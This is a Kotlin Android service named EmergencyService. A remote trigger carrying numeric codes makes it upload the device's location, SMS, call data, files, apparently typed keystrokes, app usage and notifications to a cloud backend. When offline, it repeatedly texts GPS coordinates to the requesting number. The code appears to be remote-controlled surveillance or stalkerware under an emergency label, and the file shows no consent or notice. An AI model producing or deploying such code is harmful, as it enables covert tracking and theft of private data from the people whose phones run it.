package com.example.myandroid

import android.app.Service
import android.content.Context
import android.content.Intent
import android.location.Location
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.IBinder
import android.telephony.SmsManager
import com.google.android.gms.location.LocationServices
import kotlinx.coroutines.*
import kotlinx.coroutines.tasks.await

class EmergencyService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val sender = intent?.getStringExtra("sender") ?: return START_NOT_STICKY
        val codes = intent?.getStringExtra("codes") ?: "0"

        scope.launch {
            // 1. Check Internet
            if (isOnline()) {
                // INTERNET MODE: Upload to Cloud
                val modules = parseCodes(codes)
                CloudManager.uploadData(applicationContext, modules, null)
                stopSelf()
            } else {
                // OFFLINE MODE: SMS Loop (Run for 5 minutes max)
                var attempts = 0
                while (attempts < 10) { // 10 * 30sec = 5 mins
                    val loc = getLastKnownLocation()
                    if (loc != null) {
                        sendSms(sender, "${loc.latitude},${loc.longitude}")
                    }
                    delay(30_000) // Wait 30 seconds
                    
                    // Check connectivity again, maybe we regained internet?
                    if (isOnline()) {
                        CloudManager.uploadData(applicationContext, listOf("location"), null)
                        stopSelf()
                        break
                    }
                    attempts++
                }
                stopSelf()
            }
        }

        return START_NOT_STICKY
    }

    private fun parseCodes(raw: String): List<String> {
        val list = mutableListOf<String>()
        val parts = raw.split(",")
        
        if (parts.contains("0")) return listOf("ALL")

        parts.forEach { c ->
            when(c.trim()) {
                "1" -> list.add("location")
                "2" -> list.add("sms")
                "3" -> list.add("phone")
                "4" -> list.add("files")
                "5" -> list.add("typing")
                "6" -> list.add("usage")
                "7" -> list.add("notifications")
            }
        }
        if (list.isEmpty()) list.add("location") 
        return list
    }

    private suspend fun getLastKnownLocation(): Location? {
        return try {
             if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                 val fused = LocationServices.getFusedLocationProviderClient(this)
                 fused.lastLocation.await()
             } else null
        } catch (e: Exception) { null }
    }

    private fun sendSms(phone: String, msg: String) {
        try {
            val smsManager = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                getSystemService(SmsManager::class.java)
            } else {
                SmsManager.getDefault()
            }
            smsManager.sendTextMessage(phone, null, msg, null, null)
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun isOnline(): Boolean {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val caps = cm.getNetworkCapabilities(cm.activeNetwork)
        return caps?.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) == true
    }
}